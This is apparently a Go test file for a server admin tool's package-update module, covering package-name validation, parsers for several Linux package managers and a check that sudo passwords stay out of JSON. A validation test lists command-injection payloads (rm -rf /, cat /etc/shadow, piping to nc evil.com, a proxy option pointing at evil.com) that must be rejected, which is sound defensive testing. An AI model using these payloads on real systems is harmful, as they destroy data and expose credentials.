package host

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/kraken/admin-tool/backend/internal/models"
)

type mockExecutor struct {
	responses map[string]string
	executed  []string
	sudoCalls []string
	stdinData []string
}

func (m *mockExecutor) Execute(ctx context.Context, cmd string) (string, string, int, error) {
	m.executed = append(m.executed, cmd)
	for pattern, resp := range m.responses {
		if strings.Contains(cmd, pattern) {
			return resp, "", 0, nil
		}
	}
	return "", "", 0, nil
}

func (m *mockExecutor) ExecuteSudo(ctx context.Context, cmd string, sudoPassword string) (string, string, int, error) {
	m.sudoCalls = append(m.sudoCalls, cmd)
	m.stdinData = append(m.stdinData, sudoPassword)
	if sudoPassword == "wrong-password" {
		return "", "sudo: 1 incorrect password attempt", 1, ErrInvalidSudoPassword
	}
	for pattern, resp := range m.responses {
		if strings.Contains(cmd, pattern) {
			return resp, "", 0, nil
		}
	}
	return "ok", "", 0, nil
}

func (m *mockExecutor) ExecuteSudoStream(ctx context.Context, cmd string, sudoPassword string, onChunk func(string)) (string, string, int, error) {
	stdout, stderr, exitCode, err := m.ExecuteSudo(ctx, cmd, sudoPassword)
	if onChunk != nil && stdout != "" {
		onChunk(stdout)
	}
	return stdout, stderr, exitCode, err
}

func TestValidatePackageName_Security(t *testing.T) {
	valid := []string{
		"nginx",
		"curl-7.88.1",
		"libssl3",
		"g++",
		"linux-image-6.1.0-18-amd64",
		"docker-ce_24.0.5",
		"pkg.1.2.3",
	}

	for _, name := range valid {
		if err := ValidatePackageName(name); err != nil {
			t.Errorf("expected valid package name %q, got error: %v", name, err)
		}
	}

	// Security: Command injection payloads must be blocked
	malicious := []string{
		"nginx; rm -rf /",
		"curl && cat /etc/shadow",
		"$(reboot)",
		"`whoami`",
		"pkg | nc evil.com 4444",
		"foo\nbar",
		"pkg > /etc/passwd",
		"pkg<input",
		"pkg' OR '1'='1",
		"\" ; reboot ; \"",
		"-oProxy=http://evil.com",
		"--option",
		"-y",
		"--version",
		"-f",
		"+dangerous",
		"",
		"   ",
	}

	for _, name := range malicious {
		if err := ValidatePackageName(name); err == nil {
			t.Errorf("SECURITY RISK: malicious package name %q was accepted as valid!", name)
		}
	}
}

func TestParseAptOutput(t *testing.T) {
	sampleApt := `
Inst libssl3 [3.0.11-1~deb12u1] (3.0.13-1~deb12u1 Debian-Security:12/stable-security [amd64])
Inst curl [7.88.1-10+deb12u4] (7.88.1-10+deb12u5 Debian:12.5/stable [amd64])
Inst nginx-common [1.22.1-9] (1.22.1-9+deb12u1 Debian:12.5/stable [all])
Conf libssl3 (3.0.13-1~deb12u1 Debian-Security:12/stable-security [amd64])
Conf curl (7.88.1-10+deb12u5 Debian:12.5/stable [amd64])
`

	updates := ParseAptOutput(sampleApt)
	if len(updates) != 3 {
		t.Fatalf("expected 3 updates, got %d", len(updates))
	}

	// Verify libssl3 is recognized as security update
	if updates[0].Name != "libssl3" {
		t.Errorf("expected name 'libssl3', got %s", updates[0].Name)
	}
	if updates[0].CurrentVersion != "3.0.11-1~deb12u1" {
		t.Errorf("expected current version '3.0.11-1~deb12u1', got %s", updates[0].CurrentVersion)
	}
	if updates[0].NewVersion != "3.0.13-1~deb12u1" {
		t.Errorf("expected new version '3.0.13-1~deb12u1', got %s", updates[0].NewVersion)
	}
	if !updates[0].IsSecurity {
		t.Errorf("expected libssl3 to be marked as security update")
	}

	// Verify curl is standard update
	if updates[1].Name != "curl" {
		t.Errorf("expected name 'curl', got %s", updates[1].Name)
	}
	if updates[1].IsSecurity {
		t.Errorf("expected curl not to be marked as security update")
	}
}

func TestParseDnfOutput(t *testing.T) {
	sampleDnf := `
Last metadata expiration check: 0:12:34 ago.

openssl.x86_64                     1:3.0.7-27.el9_2                 baseos
systemd.x86_64                     252-14.el9_2.3                   baseos
`
	updates := ParseDnfOutput(sampleDnf)
	if len(updates) != 2 {
		t.Fatalf("expected 2 updates, got %d", len(updates))
	}

	if updates[0].Name != "openssl" {
		t.Errorf("expected openssl, got %s", updates[0].Name)
	}
	if updates[0].NewVersion != "1:3.0.7-27.el9_2" {
		t.Errorf("expected 1:3.0.7-27.el9_2, got %s", updates[0].NewVersion)
	}
}

func TestParseApkOutput(t *testing.T) {
	sampleApk := `
musl-1.2.4-r1 < 1.2.4-r2
busybox-1.36.1-r0 < 1.36.1-r2
`
	updates := ParseApkOutput(sampleApk)
	if len(updates) != 2 {
		t.Fatalf("expected 2 updates, got %d", len(updates))
	}

	if updates[0].Name != "musl" {
		t.Errorf("expected 'musl', got %s", updates[0].Name)
	}
	if updates[0].CurrentVersion != "1.2.4-r1" {
		t.Errorf("expected '1.2.4-r1', got %s", updates[0].CurrentVersion)
	}
	if updates[0].NewVersion != "1.2.4-r2" {
		t.Errorf("expected '1.2.4-r2', got %s", updates[0].NewVersion)
	}
}

func TestParsePacmanOutput(t *testing.T) {
	samplePacman := `
linux 6.7.1.arch1-1 -> 6.7.2.arch1-1
openssh 9.6p1-1 -> 9.6p1-2
`
	updates := ParsePacmanOutput(samplePacman)
	if len(updates) != 2 {
		t.Fatalf("expected 2 updates, got %d", len(updates))
	}

	if updates[0].Name != "linux" {
		t.Errorf("expected 'linux', got %s", updates[0].Name)
	}
	if updates[0].CurrentVersion != "6.7.1.arch1-1" {
		t.Errorf("expected '6.7.1.arch1-1', got %s", updates[0].CurrentVersion)
	}
	if updates[0].NewVersion != "6.7.2.arch1-1" {
		t.Errorf("expected '6.7.2.arch1-1', got %s", updates[0].NewVersion)
	}
}

func TestParseZypperOutput(t *testing.T) {
	sampleZypper := `
S | Repository          | Name    | Current Version | Available Version | Arch
--+---------------------+---------+-----------------+-------------------+-------
v | Main Update Channel | curl    | 7.79.1-150200.7 | 7.79.1-150200.8   | x86_64
v | Main Update Channel | openssl | 1.1.1l-150200.4 | 1.1.1l-150200.5   | x86_64
`
	updates := ParseZypperOutput(sampleZypper)
	if len(updates) != 2 {
		t.Fatalf("expected 2 updates, got %d", len(updates))
	}

	if updates[0].Name != "curl" || updates[0].CurrentVersion != "7.79.1-150200.7" || updates[0].NewVersion != "7.79.1-150200.8" {
		t.Errorf("unexpected curl update: %+v", updates[0])
	}
}

func TestDetectPackageManager(t *testing.T) {
	exec := &mockExecutor{
		responses: map[string]string{
			"command -v": "apt\n",
		},
	}
	pm, err := DetectPackageManager(context.Background(), exec)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if pm != "apt" {
		t.Errorf("expected 'apt', got %s", pm)
	}
}

func TestUpgradePackages_CommandInjectionPrevention(t *testing.T) {
	exec := &mockExecutor{responses: map[string]string{}}
	ctx := context.Background()

	// Should reject malicious package names
	malicious := []string{"curl", "nginx; rm -rf /"}
	_, err := UpgradePackages(ctx, exec, "apt", malicious, "password")
	if err == nil {
		t.Fatal("SECURITY RISK: UpgradePackages did not reject injection payload!")
	}

	// Should fail with ErrInvalidSudoPassword when wrong password
	_, err = UpgradePackages(ctx, exec, "apt", []string{"curl"}, "wrong-password")
	if err != ErrInvalidSudoPassword {
		t.Errorf("expected ErrInvalidSudoPassword, got %v", err)
	}
}

func TestCredentialLeakPrevention_JSONSerialization(t *testing.T) {
	server := models.DockerServer{
		ID:                   123,
		Name:                 "prod-node",
		HostURL:              "ssh://ubuntu@10.0.0.1:22",
		CredentialPolicy:     "save_securely",
		SudoPolicy:           "save_securely",
		SudoPassword:         "super-secret-sudo-password-12345",
		HasSavedSudoPassword: true,
	}

	data, err := json.Marshal(server)
	if err != nil {
		t.Fatalf("failed to marshal server: %v", err)
	}

	serialized := string(data)

	// SECURITY PENTEST CHECK: Ensure SudoPassword is never exposed in JSON output
	if strings.Contains(serialized, "super-secret-sudo-password-12345") {
		t.Fatalf("CRITICAL SECURITY VULNERABILITY: SudoPassword leaked in serialized JSON! %s", serialized)
	}

	// Verify public indicator is present
	if !strings.Contains(serialized, `"has_saved_sudo_password":true`) {
		t.Errorf("expected has_saved_sudo_password to be serialized")
	}
}

func TestEmptyPackageUpdates_JSONSerialization(t *testing.T) {
	aptUpdates := ParseAptOutput("")
	dnfUpdates := ParseDnfOutput("")
	apkUpdates := ParseApkOutput("")
	pacmanUpdates := ParsePacmanOutput("")
	zypperUpdates := ParseZypperOutput("")

	for name, list := range map[string][]models.PackageUpdate{
		"apt":    aptUpdates,
		"dnf":    dnfUpdates,
		"apk":    apkUpdates,
		"pacman": pacmanUpdates,
		"zypper": zypperUpdates,
	} {
		data, err := json.Marshal(list)
		if err != nil {
			t.Fatalf("failed to marshal %s updates: %v", name, err)
		}
		if string(data) != "[]" {
			t.Errorf("expected %s empty updates to serialize as '[]', got %q", name, string(data))
		}
	}

	status := models.HostPackageStatus{
		ServerID:       1,
		ServerName:     "test-host",
		PackageManager: "apt",
		Updates:        aptUpdates,
	}
	statusData, err := json.Marshal(status)
	if err != nil {
		t.Fatalf("failed to marshal status: %v", err)
	}
	if !strings.Contains(string(statusData), `"updates":[]`) {
		t.Errorf("expected HostPackageStatus with 0 updates to serialize as '\"updates\":[]', got %s", string(statusData))
	}
}
